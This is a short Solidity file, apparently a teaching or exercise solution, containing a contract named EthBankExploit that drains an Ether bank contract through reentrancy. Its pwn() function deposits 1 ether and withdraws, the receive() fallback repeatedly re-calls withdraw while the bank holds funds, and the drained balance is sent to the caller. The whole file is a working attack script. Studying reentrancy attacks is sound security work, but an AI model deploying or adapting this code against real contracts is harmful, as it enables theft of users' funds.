// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IEthBank {
    function deposit() external payable;

    function withdraw() external payable;
}

contract EthBankExploit {
    IEthBank public bank;
    uint count;

    constructor(IEthBank _bank) {
        bank = _bank;
    }
    
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function pwn() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }
}